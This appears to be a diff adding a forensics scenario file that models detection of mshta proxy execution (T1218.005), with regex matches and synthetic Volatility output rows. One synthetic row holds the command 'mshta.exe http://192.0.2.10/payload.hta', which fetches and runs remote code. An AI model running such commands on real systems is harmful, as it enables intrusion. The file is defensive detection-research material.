@@ -1,0 +1,45 @@
+id = "S02"
+name = "mshta proxy execution"
+technique = "T1218.005"
+tactic = "defense-evasion"
+platform = "windows"
+environment = "onprem"
+timepoints = [0, 5, 15, 60]
+notes = "Atomic Red Team T1218.005 tests. Short-lived helper process; expect fast loss."
+
+[[artefact]]
+id = "mshta_cmdline"
+category = "execution"
+weight = 3
+plugin = "windows.cmdline.CmdLine"
+description = "mshta launched with a remote or script-protocol target."
+[artefact.match]
+Args = '(?i)mshta(\.exe)?"?\s+(https?://|vbscript:|javascript:)'
+[artefact.partial]
+Args = '(?i)mshta(\.exe)?'
+[artefact.synthetic]
+p = [1.0, 0.5, 0.15, 0.0]
+row = { PID = 5120, Process = "mshta.exe", Args = 'mshta.exe http://192.0.2.10/payload.hta' }
+partial_row = { PID = 5120, Process = "mshta.exe", Args = 'mshta.exe' }
+
+[[artefact]]
+id = "mshta_process"
+category = "execution"
+weight = 1
+plugin = "windows.pslist.PsList"
+[artefact.match]
+ImageFileName = '(?i)^mshta(\.exe)?$'
+[artefact.synthetic]
+p = [1.0, 0.5, 0.15, 0.0]
+row = { PID = 5120, PPID = 4100, ImageFileName = "mshta.exe", ExitTime = "" }
+
+[[artefact]]
+id = "mshta_network"
+category = "network"
+weight = 2
+plugin = "windows.netscan.NetScan"
+[artefact.match]
+Owner = '(?i)^mshta'
+[artefact.synthetic]
+p = [0.9, 0.3, 0.05, 0.0]
+row = { PID = 5120, Owner = "mshta.exe", Proto = "TCPv4", ForeignAddr = "192.0.2.10", ForeignPort = 80, State = "CLOSE_WAIT" }
